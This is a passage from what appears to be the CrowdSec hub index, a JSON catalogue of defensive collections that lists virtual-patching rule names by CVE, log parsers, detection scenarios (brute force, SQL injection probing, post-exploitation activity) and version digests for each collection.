crowdsecurity/appsec-default\nappsec-rules:\n- crowdsecurity/base-config\n- crowdsecurity/vpatch-env-access\n- crowdsecurity/vpatch-CVE-2023-40044\n- crowdsecurity/vpatch-CVE-2017-9841\n- crowdsecurity/vpatch-CVE-2020-11738\n- crowdsecurity/vpatch-CVE-2022-27926\n- crowdsecurity/vpatch-CVE-2022-35914\n- crowdsecurity/vpatch-CVE-2022-46169\n- crowdsecurity/vpatch-CVE-2023-20198\n- crowdsecurity/vpatch-CVE-2023-22515\n- crowdsecurity/vpatch-CVE-2023-33617\n- crowdsecurity/vpatch-CVE-2023-34362\n- crowdsecurity/vpatch-CVE-2023-3519\n- crowdsecurity/vpatch-CVE-2023-42793\n- crowdsecurity/vpatch-CVE-2023-50164\n- crowdsecurity/vpatch-CVE-2023-38205\n- crowdsecurity/vpatch-CVE-2023-24489\n- crowdsecurity/vpatch-CVE-2021-3129\n- crowdsecurity/vpatch-CVE-2021-22941\n- crowdsecurity/vpatch-CVE-2019-12989\n- crowdsecurity/vpatch-CVE-2022-44877\n- crowdsecurity/vpatch-CVE-2018-10562\n- crowdsecurity/vpatch-CVE-2023-6553\n- crowdsecurity/vpatch-CVE-2018-1000861\n- crowdsecurity/vpatch-CVE-2019-1003030\n- crowdsecurity/vpatch-CVE-2022-22965\n- crowdsecurity/vpatch-CVE-2023-23752\n- crowdsecurity/vpatch-CVE-2023-49070\n- crowdsecurity/vpatch-laravel-debug-mode\n- crowdsecurity/vpatch-CVE-2023-28121\n- crowdsecurity/vpatch-CVE-2020-17496\n- crowdsecurity/vpatch-CVE-2023-1389\n- crowdsecurity/vpatch-CVE-2023-7028\n- crowdsecurity/vpatch-CVE-2023-46805\n- crowdsecurity/vpatch-CVE-2024-23897\n- crowdsecurity/vpatch-CVE-2023-22527\n- crowdsecurity/vpatch-CVE-2023-35078\n- crowdsecurity/vpatch-CVE-2023-35082\n- crowdsecurity/vpatch-CVE-2022-22954\n- crowdsecurity/vpatch-CVE-2024-1212\n- crowdsecurity/vpatch-symfony-profiler\n- crowdsecurity/vpatch-connectwise-auth-bypass\n- crowdsecurity/vpatch-CVE-2024-22024\n- crowdsecurity/vpatch-CVE-2024-27198\n- crowdsecurity/vpatch-CVE-2024-3273\n- crowdsecurity/vpatch-CVE-2024-4577\n- crowdsecurity/vpatch-CVE-2024-29849\n- crowdsecurity/vpatch-CVE-2023-47218\n- crowdsecurity/vpatch-git-config\n- crowdsecurity/vpatch-CVE-2024-32113\n- crowdsecurity/vpatch-CVE-2024-3272\n- crowdsecurity/vpatch-CVE-2024-28255\n- crowdsecurity/vpatch-CVE-2024-29824\n- crowdsecurity/vpatch-CVE-2024-27348\n- crowdsecurity/vpatch-CVE-2020-5902\n- crowdsecurity/vpatch-CVE-2018-13379\n- crowdsecurity/vpatch-CVE-2022-26134\n- crowdsecurity/vpatch-CVE-2024-34102\n- crowdsecurity/vpatch-CVE-2024-29973\n- crowdsecurity/vpatch-CVE-2022-41082\n- crowdsecurity/vpatch-CVE-2019-18935\n- crowdsecurity/vpatch-CVE-2024-8190\n- crowdsecurity/vpatch-CVE-2024-28987\n- crowdsecurity/vpatch-CVE-2024-38856\n- crowdsecurity/vpatch-CVE-2018-20062\n- crowdsecurity/vpatch-CVE-2021-26086\n- crowdsecurity/vpatch-CVE-2024-51567\n- crowdsecurity/vpatch-CVE-2024-27956\n- crowdsecurity/vpatch-CVE-2024-27954\n- crowdsecurity/vpatch-CVE-2024-0012\n- crowdsecurity/vpatch-CVE-2024-9474\n- crowdsecurity/vpatch-CVE-2024-7593\n- crowdsecurity/vpatch-CVE-2024-52301\n- crowdsecurity/vpatch-CVE-2024-8963\n- crowdsecurity/vpatch-CVE-2024-38816\n- crowdsecurity/vpatch-CVE-2024-9465\n- crowdsecurity/vpatch-CVE-2024-51378\n- crowdsecurity/vpatch-CVE-2024-41713\n- crowdsecurity/vpatch-CVE-2024-6205\n- crowdsecurity/vpatch-CVE-2025-29927\n- crowdsecurity/vpatch-CVE-2022-25488\n- crowdsecurity/vpatch-CVE-2020-9054\n- crowdsecurity/vpatch-CVE-2024-27564\n- crowdsecurity/vpatch-CVE-2021-44529\n- crowdsecurity/vpatch-CVE-2024-57727\n- crowdsecurity/vpatch-CVE-2024-27292\n- crowdsecurity/vpatch-CVE-2025-24893\n- crowdsecurity/vpatch-CVE-2021-43798\n- crowdsecurity/vpatch-CVE-2022-1388\n- crowdsecurity/vpatch-CVE-2021-26294\n- crowdsecurity/vpatch-CVE-2002-1131\n- crowdsecurity/vpatch-CVE-2023-0297\n- crowdsecurity/vpatch-CVE-2007-0885\n- crowdsecurity/vpatch-CVE-2024-32870\n- crowdsecurity/vpatch-CVE-2025-28367\n- crowdsecurity/vpatch-CVE-2025-3248\n- crowdsecurity/vpatch-CVE-2025-31161\n- crowdsecurity/vpatch-CVE-2025-31324\n- crowdsecurity/vpatch-CVE-2025-29306\n- crowdsecurity/vpatch-CVE-2025-49113\n- crowdsecurity/appsec-generic-test\n- crowdsecurity/vpatch-CVE-2025-25257\n- crowdsecurity/vpatch-CVE-2019-5418\n- crowdsecurity/vpatch-CVE-2025-52488\n- crowdsecurity/vpatch-CVE-2025-49132\n- crowdsecurity/vpatch-CVE-2025-47812\n- crowdsecurity/vpatch-CVE-2024-51977\n- crowdsecurity/vpatch-CVE-2022-31499\n- crowdsecurity/vpatch-CVE-2025-57819\n- crowdsecurity/vpatch-CVE-2024-46506\n- crowdsecurity/vpatch-CVE-2025-3605\n- crowdsecurity/vpatch-CVE-2024-29028\n- crowdsecurity/vpatch-CVE-2023-6000\n- crowdsecurity/vpatch-CVE-2024-0204\n- crowdsecurity/vpatch-CVE-2020-25078\n- crowdsecurity/vpatch-CVE-2023-23063\n- crowdsecurity/vpatch-CVE-2022-38627\n- crowdsecurity/vpatch-CVE-2025-36604\n- crowdsecurity/vpatch-CVE-2025-61882\nauthor: crowdsecurity\ncontexts:\n- crowdsecurity/appsec_base\ndescription: a generic virtual patching collection, suitable for most web servers.\nname: crowdsecurity/appsec-virtual-patching\nparsers:\n- crowdsecurity/appsec-logs\nscenarios:\n- crowdsecurity/appsec-vpatch\n- crowdsecurity/appsec-native\n- crowdsecurity/appsec-generic-test\n", "contexts": ["crowdsecurity/appsec_base"], "description": "a generic virtual patching collection, suitable for most web servers.", "parsers": ["crowdsecurity/appsec-logs"], "path": "collections/crowdsecurity/appsec-virtual-patching.yaml", "scenarios": ["crowdsecurity/appsec-vpatch", "crowdsecurity/appsec-native", "crowdsecurity/appsec-generic-test"], "version": "9.1", "versions": {"0.1": {"digest": "a165d638c8d826a932e4ca4e70ec5379d558a0bee1356e871c7c92cc2df714fc"}, "0.2": {"digest": "4bacd3307cc84a5498d0939c83df3eccf40f430d4eedbdc1f7e7ae1fb8b71676"}, "0.3": {"digest": "28962f063f10702629018df810167378d8250185ab8d64f4f5d1454b14dd1d4f"}, "0.4": {"digest": "669b4be106d8d3e7754eeafba093db2228f2750dc399d8d9a41c3bb8256712fb"}, "0.5": {"digest": "b15a1c03f30928de35d1744f77a32dd4efe06517a9d14a640c13035124922a20"}, "0.6": {"digest": "9ef6be9953b564972004433adab368203163324bc71f236e0589b567b7c8f97b"}, "0.7": {"digest": "129a0eed7b8997130d904d6fbf1ba165927c17075b9c541eeb4cb150c6540fa4"}, "0.8": {"digest": "c01f361d48f93381b296a9c528992adee4637df7e161881ba8f41752cea70abd"}, "0.9": {"digest": "9dd886832f31bace922431d965094f1c1b38320ea0a84c1badc4a9e895a630d9"}, "1.0": {"digest": "da6cc931742c52dd5594b7b30cc9f8a0c974d1d3edbfd778c1919d7212ed9693"}, "1.1": {"digest": "4d3d9a150db5cd5735c794c5031858e62bdac6d2db7515cf3562860af448ddfd"}, "1.2": {"digest": "3867ac305d5120a69e41b00ec6176702b5d28a99086b7bab3b43ae84ce7b9f0f"}, "1.3": {"digest": "f255eae826b30e3f55b2abd06fad49a20eb3c7f479a557bb140d5894703eef4d"}, "1.4": {"digest": "8340b80826f3265925d371ea3c1fb714fc44d0effacf8f61939a52284edead40"}, "1.5": {"digest": "eef32a81c61cdd4527beca1d6e97aa0d6263ed19766aa6dfdbc68862a42d0844"}, "1.6": {"digest": "2519bff9f2587cc4978ee747ad7bc5abff0df3cb196c79eee5061bc8bf76ce93"}, "1.7": {"digest": "acea1f3ced4acc7073d8976ecb61fa60add9716deb267776a03b097f4cf2d7da"}, "1.8": {"digest": "2b370a30949b679cf0fff192026a8f0155b88c79d4a81a642620b29f4090bf1c"}, "1.9": {"digest": "e3756e1e6a6767094855fd5a333933ca3018b9ad91088b3e4aa2acfc50857f21"}, "2.0": {"digest": "c09ee7339dbed0c05974f8ef4d04770f31e7898aef1438a73f29cffb364f5fe1"}, "2.1": {"digest": "fc1ef8a2e1323bce88166aa776062c6aa25b22da058200d60d541209fdd82157"}, "2.2": {"digest": "ca70bd5441148709346929b7a8ccb9a5e9cbd7a4d5756991a9c6e6fa99245cec"}, "2.3": {"digest": "51a32651bd5fe6642a0e7a26930ecebadb72625088c611e4b12582fdfc8536b0"}, "2.4": {"digest": "b95e84a811b4f1bfcb342d7627fbacb259a995bddd553d3acbfc2851fcbdfe8f"}, "2.5": {"digest": "aec91d6be5bb8b0a3fe6c20aaa806eb619e335b9b8c7d299a0b02d312666505b"}, "2.6": {"digest": "b1681f06a22dd41a5faf1bf8cbbdecb4012517defd20399fad2a505d0aa32250"}, "2.7": {"digest": "cfe60b7855a7591bdecf89aee1897f491c88f7daa6269f0e40dfd79165f669b7"}, "2.8": {"digest": "2201db5d448c155438beb55a34dd87ce649968118ba1c1960db085aa26e18f24"}, "2.9": {"digest": "73305f1c435480e871a94ec59f09e71e93c41b2ae0e8af4faad789e314400436"}, "3.0": {"digest": "ac6307b79c4bb31ad396a1a8f4f080edc339f97c2fba54805c7ffb07d1ef6983"}, "3.1": {"digest": "a8699f10f6e47357969aa07e6e77607dfac7246fa231f59e0a9a363ba3fdfc3b"}, "3.2": {"digest": "73305f1c435480e871a94ec59f09e71e93c41b2ae0e8af4faad789e314400436"}, "3.3": {"digest": "7cd4bdca37098a2a398262c253dfa2d2925168b1820cc58ea62ea953a1517722"}, "3.4": {"digest": "0b89691d948596e37fc998f369d2f782b0357f0036a6752ae5b3811566615236"}, "3.5": {"digest": "b3954ab20799bf5e8f4217aff7487fd2053d68ac570f85b353699705f15b2dbc"}, "3.6": {"digest": "ef44f9692220ce052b4d39829021ac4d9f7257714f87b9b2081d1cca7c39d36c"}, "3.7": {"digest": "90d32e8091a3bfc3b60a10e199df5b3e3a60402da5e32dc4cf6c4138c2de83ec"}, "3.8": {"digest": "b6d443d5023980301f177fd9797fdc5053c40d3449feebabdad170e527086778"}, "3.9": {"digest": "321e359895a43e8bdecf3e935829664a34b74f345a23d7cbdbe38d73aa45aaf1"}, "4.0": {"digest": "368679c328cc886eb25027046c94d82d141bc701e9fa398275c6ee4d5a6de70e"}, "4.1": {"digest": "541309db799190b3791bd72fd289cdab50c8ba7d90ae99084918ace0a890050a"}, "4.2": {"digest": "db45e9ff4b84538b8402dd1fc57ee137ad14562f15fbd7719f4f5813e824b71a"}, "4.3": {"digest": "f526f84b222b2e83c148c4c028c69ae124b04d790877084395a1750b38ecaae9"}, "4.4": {"digest": "ba304a73baf21c9d547dbf7dbb7507173b3ad5ec139cbb762cb13fc78819278f"}, "4.5": {"digest": "702bce51ce84b376355b93e8accf3943b50007fcebcb3388eec8771806ba726b"}, "4.6": {"digest": "a96e4880adb015a86249a6808fe7085d9c5bb37e6351adbbe105b5f3ac53cac6"}, "4.7": {"digest": "be7baa78901f12377f0d346d46a38c9ff4f73f0c584d32ff3373ed8c2abe5560"}, "4.8": {"digest": "377382bb123e07cc76b8c4a6806e64275267b4a8e8c9f70841993788458d3608"}, "4.9": {"digest": "138de42ce4e21da2d61b57592a50b511fbca5acde7acac6f4fafc803446c05ee"}, "5.0": {"digest": "5d58d44c4848c757e5ffa31fa37ab33a562c146101d621a2a6a16dd90c5f40d1"}, "5.1": {"digest": "e479092a82f74d97aaaa20aae28a69e4543fc7f0edeb8ded09cafd1c4a9875b5"}, "5.2": {"digest": "89dfc735140921d8a7477082316a8404e2ccecc89d4ee59221edf0ba501f97fc"}, "5.3": {"digest": "2662c524532ade831fc213f9210fee7a4cd7746f8f6a80d84af87e65634a5c0b"}, "5.4": {"digest": "d8a6e0d88f986c4d9411cf98037ad4efb0bd5795ccb3181dfe18caa739618df7"}, "5.5": {"digest": "b0ad6c887a470f1ae04e838550869ddcb1279043a10b6f6cce11406811dae683"}, "5.6": {"digest": "cb0be5d52e1c9c6fa66309e5e0945bc00c69e1d12abeb53b676d044b95c635cc"}, "5.7": {"digest": "a4910b1a07a7db85fc4e1ddf2baf07cdba9b34f94e2e979f23b9e914d34c7a6d"}, "5.8": {"digest": "0c101be829d6e5b5f516e459d6ab014eca6f3948ce49a88073523ee899e26fdd"}, "5.9": {"digest": "b503b247ae4a3cde817bd016918932d2ae08f54f9177d8d911952e782c6af424"}, "6.0": {"digest": "ca5ba52db2c31eecb069e7c583094a8e887bbd0676da9cbd5ff21bd841e3ab51"}, "6.1": {"digest": "cb5b6422ee0e19f873de425bddda7b485fda72db2d81af8c969fa05f76a93e24"}, "6.2": {"digest": "1fe3a9f6dcb57c1cff086d2851ad272a2a1b59cf5e0868f7be67300b1ea29892"}, "6.3": {"digest": "5dd062aba7bfeaed22a9f3662b5089f51b23729b42aae46fcde7d76d7277e54e"}, "6.4": {"digest": "4981341895082a4689ccaf6ead02e5f07a63fb8bbfc638302c84b380919449f7"}, "6.5": {"digest": "5847d0a6ca03c01f6a9b4dfdc32f9c8ddca03c39811d34760a69394dbaffc6fe"}, "6.6": {"digest": "26f7ed4fa12cf7f85adf48b1eb5856ebd8b63a8dd6dbc9939d955a42cea497da"}, "6.7": {"digest": "7e7f2b9611c52eb2be1c8f84347260b183ba4c993eef4e5019317ae02c91a8de"}, "6.8": {"digest": "9da56c32c2c11ea2560a99edea3f77130e1096e9b123a6c7879d4a4c6f241ed5"}, "6.9": {"digest": "e0af146bd79b9dd3493f8ba7a784fc2038d20e705eeb77d977dca8f57baa2b34"}, "7.0": {"digest": "ae7ba86599d8993e678c6e22512e8c52e708993c9cb0f9a054ece7765c9f0f78"}, "7.1": {"digest": "205a5baa8a0281f461cfd9b563ddee4ee33f68933fe0187174dc5db2b4cd1a07"}, "7.2": {"digest": "1d614662c91dd5015775046afbfe32fe277cf7e387fa1de2df8119867de5f5c7"}, "7.3": {"digest": "739dc946f2bf95a3d2602a0a4877a293aa781bdc137afe219d035dade65f59f9"}, "7.4": {"digest": "852f04ba2702ed9c43aec3ead7f0a42c009c2d7f444c47012f19e84494c43011"}, "7.5": {"digest": "16d2d93a048170385e00e8fdecda9374082990435db9aecbfea64e0af1fc5499"}, "7.6": {"digest": "f49abb79417a6918eccc73ff389fc92b3f5646077f3ab28fb7296b62aa224569"}, "7.7": {"digest": "fe8e9ba74c44ea7641f4626f5c70d77f4a1ae9ab6d2e7e6a1b72e7beec9fe290"}, "7.8": {"digest": "ecc78a7e9d785ef8db091b98b7e1bc7a42f2941f4802fb56e0075f43b0b71d85"}, "7.9": {"digest": "d119c546eda3a76d871f48ed37689479fda1de34fbdb3807528c482068b359fd"}, "8.0": {"digest": "ab689f3b5da99e043ca7d256c0fd8607df72078c9ccd9848e68b45baf170a2b6"}, "8.1": {"digest": "0d5453ae21c3d39fb2bb4af42d3cfc452c9ea5f7797a85b7db4532f347ca5d21"}, "8.2": {"digest": "f517b4bdcec7b877aa30b07ff9390743daaa5ff7af6a9e7639c548e5441a8596"}, "8.3": {"digest": "941427efbf2f7ae35cf56b4f35a5e10151a2b6bbc83ea28c2eab27592b2971e2"}, "8.4": {"digest": "1fce5a578ed723fa4f1ad0cd5a5ca8cc7f6654600917ec2938208193f50fbddb"}, "8.5": {"digest": "97b1509a635ee45158d146c8ae52e5a3ad023aaadada8f5985d25bb744b848bc"}, "8.6": {"digest": "c16d01b2025a5011c792fc451aa61466e60a0bc427c1a33a8cfa44903bc2f95a"}, "8.7": {"digest": "e8f288fecb8e626ea5e159e7b41dd5e58188a32b2a50b70be2f6974b9a5721f5"}, "8.8": {"digest": "425980008c52e54f46660fcd64d5c02df13e8c12358c52a75a629bc884e3da0f"}, "8.9": {"digest": "d398bb726e4bef4b3aa851ac26d0e801fd95bc38fcec5cc5a9b79ef15bceb16d"}, "9.0": {"digest": "cb0fbd9fe6e2657b15240be2287b61fd866652852a0553b73706d21d4c80a1f3"}, "9.1": {"digest": "bbda14debbfc53d3b0a8eeeb1817fcc80d1403541df78ff9014d6d91c0d44c90"}}}, "crowdsecurity/appsec-wordpress": {"appsec-configs": ["crowdsecurity/virtual-patching"], "appsec-rules": ["crowdsecurity/base-config", "crowdsecurity/vpatch-CVE-2023-0600", "crowdsecurity/vpatch-CVE-2023-0900", "crowdsecurity/vpatch-CVE-2023-2009", "crowdsecurity/vpatch-CVE-2023-23488", "crowdsecurity/vpatch-CVE-2023-23489", "crowdsecurity/vpatch-CVE-2023-4634", "crowdsecurity/vpatch-CVE-2023-6360", "crowdsecurity/vpatch-CVE-2023-6567", "crowdsecurity/vpatch-CVE-2023-6623", "crowdsecurity/vpatch-CVE-2024-1061", "crowdsecurity/vpatch-CVE-2024-1071", "crowdsecurity/generic-wordpress-uploads-php", "crowdsecurity/vpatch-CVE-2024-6205", "crowdsecurity/generic-wordpress-uploads-listing"], "content": "name: crowdsecurity/appsec-wordpress\nappsec-rules:\n  - crowdsecurity/base-config\n  - crowdsecurity/vpatch-CVE-2023-0600\n  - crowdsecurity/vpatch-CVE-2023-0900\n  - crowdsecurity/vpatch-CVE-2023-2009\n  - crowdsecurity/vpatch-CVE-2023-23488\n  - crowdsecurity/vpatch-CVE-2023-23489\n  - crowdsecurity/vpatch-CVE-2023-4634\n  - crowdsecurity/vpatch-CVE-2023-6360\n  - crowdsecurity/vpatch-CVE-2023-6567\n  - crowdsecurity/vpatch-CVE-2023-6623\n  - crowdsecurity/vpatch-CVE-2024-1061\n  - crowdsecurity/vpatch-CVE-2024-1071\n  - crowdsecurity/generic-wordpress-uploads-php\n  - crowdsecurity/vpatch-CVE-2024-6205\n  - crowdsecurity/generic-wordpress-uploads-listing\nappsec-configs:\n  - crowdsecurity/virtual-patching\nparsers:\n  - crowdsecurity/appsec-logs\nscenarios:\n  - crowdsecurity/appsec-vpatch\n  - crowdsecurity/appsec-native\ncontexts:\n  - crowdsecurity/appsec_base\ndescription: \"A virtual patching collection, suitable for WordPress websites\"\nauthor: crowdsecurity\n", "contexts": ["crowdsecurity/appsec_base"], "description": "A virtual patching collection, suitable for WordPress websites", "parsers": ["crowdsecurity/appsec-logs"], "path": "collections/crowdsecurity/appsec-wordpress.yaml", "scenarios": ["crowdsecurity/appsec-vpatch", "crowdsecurity/appsec-native"], "version": "0.6", "versions": {"0.1": {"digest": "6e7995f560a05aa0229b9aa7a4ff23d1d6418777ab4e732be74d52bea2d875f7"}, "0.2": {"digest": "6b682d61b32739dbea965b3dfc34d2c9f19577216fe49b7ea905d733d25c68e6"}, "0.3": {"digest": "db408d5534c3d187fa010e2889f0e79a3ac840ae055bcd7f1d01e1f57a51dbaf"}, "0.4": {"digest": "bd6bd103060ccf64a657129ad28f43b4c5588c2c4a206870afd543bc1c050b25"}, "0.5": {"digest": "1a58b1f382ca36cad931ae36a213c61f9c345a19aa43de7f642d8c1376d13fec"}, "0.6": {"digest": "b6d767fafb9ae11d6ea2eafb853b935cf32f74ab0c6ba2a6fd9a91afaeb0cf16"}}}, "crowdsecurity/asterisk": {"content": "parsers:\n  - crowdsecurity/asterisk-logs\nscenarios:\n  - crowdsecurity/asterisk_bf\n  - crowdsecurity/asterisk_user_enum\ndescription: \"asterisk support : parser and bruteforce/user enumeration scenarios \"\nauthor: crowdsecurity\ntags:\n  - asterisk\n  - bruteforce\n\n", "description": "asterisk support : parser and bruteforce/user enumeration scenarios ", "parsers": ["crowdsecurity/asterisk-logs"], "path": "collections/crowdsecurity/asterisk.yaml", "scenarios": ["crowdsecurity/asterisk_bf", "crowdsecurity/asterisk_user_enum"], "version": "0.1", "versions": {"0.1": {"digest": "4dcfaad1205510572bc715811b4f70a4ab12ad2a54a7ceac202ce9f2517502cd"}}}, "crowdsecurity/auditd": {"content": "parsers:\n  - crowdsecurity/auditd-logs\nscenarios:\n  - crowdsecurity/auditd-postexploit-rm\n  - crowdsecurity/auditd-postexploit-pkill\n  - crowdsecurity/auditd-postexploit-exec-from-net\n  - crowdsecurity/auditd-sus-exec\n  - crowdsecurity/auditd-base64-exec-behavior\n  - crowdsecurity/auditd-suid-crash\npostoverflows:\n  - crowdsecurity/auditd-whitelisted-process\ndescription: \"auditd support : parsers and scenarios\"\nauthor: crowdsecurity\ntags:\n  - auditd\n  - compliance\n  - postexploitation\n\n\n", "description": "auditd support : parsers and scenarios", "parsers": ["crowdsecurity/auditd-logs"], "path": "collections/crowdsecurity/auditd.yaml", "postoverflows": ["crowdsecurity/auditd-whitelisted-process"], "scenarios": ["crowdsecurity/auditd-postexploit-rm", "crowdsecurity/auditd-postexploit-pkill", "crowdsecurity/auditd-postexploit-exec-from-net", "crowdsecurity/auditd-sus-exec", "crowdsecurity/auditd-base64-exec-behavior", "crowdsecurity/auditd-suid-crash"], "version": "0.6", "versions": {"0.1": {"digest": "784496b8295720e314a9a5da7bbc6645605781a4cb46595ebb4c04b158468768"}, "0.2": {"digest": "b102e29804978190bc98a8c1b9240d3818c8f951d6878038855df2105aacb371"}, "0.3": {"digest": "f2f94b96a57723a8017ef35c1ded8f56458b0c6bd4ace3da3e26e4f88b6fa439"}, "0.4": {"digest": "13671c6d74df80a651e3f8d3e5a637950bfa54c2efcf444692d2d6b0e10d4011"}, "0.5": {"digest": "f0e852bed7179bd9e82595036714e49ec124d199d3dac02b20fe44c9aa1fdc92"}, "0.6": {"digest": "22934d51878ef76b5cece7d8af7788803d9c735f9f4a1926e1beaac56259f5f6"}}}, "crowdsecurity/aws-cis-benchmark": {"content": "parsers:\n  - crowdsecurity/aws-cloudtrail\nscenarios:\n  - crowdsecurity/aws-cis-benchmark-cloudtrail-config-change\n  - crowdsecurity/aws-cis-benchmark-config-config-change\n  - crowdsecurity/aws-cis-benchmark-console-auth-fail\n  - crowdsecurity/aws-cis-benchmark-iam-policy-change\n  - crowdsecurity/aws-cis-benchmark-kms-deletion\n  - crowdsecurity/aws-cis-benchmark-login-no-mfa\n  - crowdsecurity/aws-cis-benchmark-nacl-change\n  - crowdsecurity/aws-cis-benchmark-ngw-change\n  - crowdsecurity/aws-cis-benchmark-root-usage\n  - crowdsecurity/aws-cis-benchmark-route-table-change\n  - crowdsecurity/aws-cis-benchmark-s3-policy-change\n  - crowdsecurity/aws-cis-benchmark-security-group-change\n  - crowdsecurity/aws-cis-benchmark-unauthorized-call\n  - crowdsecurity/aws-cis-benchmark-vpc-change\ndescription: \"AWS CIS Benchmark: cloudtrail parser and alerting scenarios\"\nauthor: crowdsecurity\ntags:\n  - aws\n  - CIS benchmark\n  - compliance\n\n", "description": "AWS CIS Benchmark: cloudtrail parser and alerting scenarios", "parsers": ["crowdsecurity/aws-cloudtrail"], "path": "collections/crowdsecurity/aws-cis-benchmark.yaml", "scenarios": ["crowdsecurity/aws-cis-benchmark-cloudtrail-config-change", "crowdsecurity/aws-cis-benchmark-config-config-change", "crowdsecurity/aws-cis-benchmark-console-auth-fail", "crowdsecurity/aws-cis-benchmark-iam-policy-change", "crowdsecurity/aws-cis-benchmark-kms-deletion", "crowdsecurity/aws-cis-benchmark-login-no-mfa", "crowdsecurity/aws-cis-benchmark-nacl-change", "crowdsecurity/aws-cis-benchmark-ngw-change", "crowdsecurity/aws-cis-benchmark-root-usage", "crowdsecurity/aws-cis-benchmark-route-table-change", "crowdsecurity/aws-cis-benchmark-s3-policy-change", "crowdsecurity/aws-cis-benchmark-security-group-change", "crowdsecurity/aws-cis-benchmark-unauthorized-call", "crowdsecurity/aws-cis-benchmark-vpc-change"], "version": "0.1", "versions": {"0.1": {"digest": "cb39befddc3658a98283e8b506c349b50c61023a09f1c4a939acd0a6f5c697d3"}}}, "crowdsecurity/aws-cloudfront": {"collections": ["crowdsecurity/base-http-scenarios"], "content": "parsers:\n#generic post-parsing of http stuff\n  - crowdsecurity/aws-cloudfront\ncollections:\n  - crowdsecurity/base-http-scenarios\ndescription: \"AWS CloudFront support : parser and generic http scenarios\"\nauthor: crowdsecurity\ntags:\n  - AWS\n  - CloudFront\n  - crawl\n  - scan\n\n", "description": "AWS CloudFront support : parser and generic http scenarios", "parsers": ["crowdsecurity/aws-cloudfront"], "path": "collections/crowdsecurity/aws-cloudfront.yaml", "version": "0.1", "versions": {"0.1": {"digest": "7c24fc8b7c755194e9dcea51ada580b26c11e114c5c1003825cdcdf3c9619aa2"}}}, "crowdsecurity/aws-console": {"content": "parsers:\n#generic post-parsing of http stuff\n  - crowdsecurity/aws-cloudtrail\nscenarios:\n  - crowdsecurity/aws-bf\n  - crowdsecurity/aws-nwo-login\ndescription: \"aws cloudtrail parser and aws console bruteforce\"\nauthor: crowdsecurity\ntags:\n  - aws\n\n", "description": "aws cloudtrail parser and aws console bruteforce", "parsers": ["crowdsecurity/aws-cloudtrail"], "path": "collections/crowdsecurity/aws-console.yaml", "scenarios": ["crowdsecurity/aws-bf", "crowdsecurity/aws-nwo-login"], "version": "0.1", "versions": {"0.1": {"digest": "6016dec00d38c1716ed6c11e6c35981dd99bbde726593da257d9fdd5e7748d84"}}}, "crowdsecurity/aws-postexploit": {"content": "parsers:\n  - crowdsecurity/aws-cloudtrail\nscenarios:\n  - crowdsecurity/aws-cloudtrail-postexploit\ndescription: \"aws cloudtrail parser and aws postexploit scenarios\"\nauthor: crowdsecurity\ntags:\n  - aws\n\n", "description": "aws cloudtrail parser and aws postexploit scenarios", "parsers": ["crowdsecurity/aws-cloudtrail"], "path": "collections/crowdsecurity/aws-postexploit.yaml", "scenarios": ["crowdsecurity/aws-cloudtrail-postexploit"], "version": "0.1", "versions": {"0.1": {"digest": "c69a44ec8b86aa40e38d2817cd4eb2a1a9fb99233b1ac1428580c8cc3889f782"}}}, "crowdsecurity/base-http-scenarios": {"collections": ["crowdsecurity/http-cve"], "content": "parsers:\n  - crowdsecurity/http-logs\nscenarios:\n  - crowdsecurity/http-crawl-non_statics\n  - crowdsecurity/http-probing\n  - crowdsecurity/http-bad-user-agent\n  - crowdsecurity/http-path-traversal-probing\n  - crowdsecurity/http-sensitive-files\n  - crowdsecurity/http-sqli-probing\n  - crowdsecurity/http-xss-probing\n  - crowdsecurity/http-backdoors-attempts\n  - ltsich/http-w00tw00t\n  - crowdsecurity/http-generic-bf\n  - crowdsecurity/http-open-proxy\n  - crowdsecurity/http-admin-interface-probing\n  - crowdsecurity/http-wordpress-scan\n  - crowdsecurity/http-cve-probing\n  - crowdsecurity/http-sap-interface-probing\n  - crowdsecurity/http-generic-test\ncollections:\n  - crowdsecurity/http-cve\ncontexts:\n  - crowdsecurity/http_base\ndescription: \"http common : scanners detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - http\n  - crawl\n  - scan\n", "contexts": ["crowdsecurity/http_base"], "description": "http common : scanners detection", "parsers": ["crowdsecurity/http-logs"], "path": "collections/crowdsecurity/base-http-scenarios.yaml", "scenarios": ["crowdsecurity/http-crawl-non_statics", "crowdsecurity/http-probing", "crowdsecurity/http-bad-user-agent", "crowdsecurity/http-path-traversal-probing", "crowdsecurity/http-sensitive-files", "crowdsecurity/http-sqli-probing", "crowdsecurity/http-xss-probing", "crowdsecurity/http-backdoors-attempts", "ltsich/http-w00tw00t", "crowdsecurity/http-generic-bf", "crowdsecurity/http-open-proxy", "crowdsecurity/http-admin-interface-probing", "crowdsecurity/http-wordpress-scan", "crowdsecurity/http-cve-probing", "crowdsecurity/http-sap-interface-probing", "crowdsecurity/http-generic-test"], "version": "1.2", "versions": {"0.1": {"digest": "7ee043a9d2e063cad751e6ce5d048f02518a76d39ec81aebed3bae736b0ced9e"}, "0.2": {"digest": "affdb706e66ffd924086b24e94734589672fb531f80fe366ab06a8c3228962e2"}, "0.3": {"digest": "543df5abb020afb51f3ab9d83cdc031e95572983e72f32a59b9f6f75cac990c3"}, "0.4": {"digest": "15018789eeb01f907fad18a16a1bfd3dc4be972455b22b86c73fd95ef334a072"}, "0.5": {"digest": "98c63493ca04367acd2d889d54141f9bcf22573301b161d6d268ca053159e94e"}, "0.6": {"digest": "2d70781df8c630d36e5f4800bde77dd7e130481e9c658aa0b3aae7ae95e15271"}, "0.7": {"digest": "539db14da32a19da683fcfd9c0c92263be5b463e037a3ce35851039c8b512f08"}, "0.8": {"digest": "dd439becb69e8457354287d0d978476e15e256bc9c4c7143fa4b9981770bf311"}, "0.9": {"digest": "a8b3855c42316452d5133deb76e2fc6acafa7a1dd02c6ae59fab5369595a2911"}, "1.0": {"digest": "b0c860f48e5d24ba5e278523e5b1652ae370228eaadcc809db1f5b3463c8ce46"}, "1.1": {"digest": "578273ecb9b682ed4e34d0ca517a01f73959de550e500493e0d7c7ed253f9075"}, "1.2": {"digest": "07bc2793de1033ecf67290ab5f85837da932ed19cb8923fd002ed961fd4cbcd2"}}}, "crowdsecurity/caddy": {"collections": ["crowdsecurity/base-http-scenarios"], "content": "parsers:\n  - crowdsecurity/caddy-logs\ncollections:\n  - crowdsecurity/base-http-scenarios\ndescription: \"caddy support : parser and generic http scenarios\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - caddy\n  - crawl\n  - scan\n", "description": "caddy support : parser and generic http scenarios", "parsers": ["crowdsecurity/caddy-logs"], "path": "collections/crowdsecurity/caddy.yaml", "version": "0.1", "versions": {"0.1": 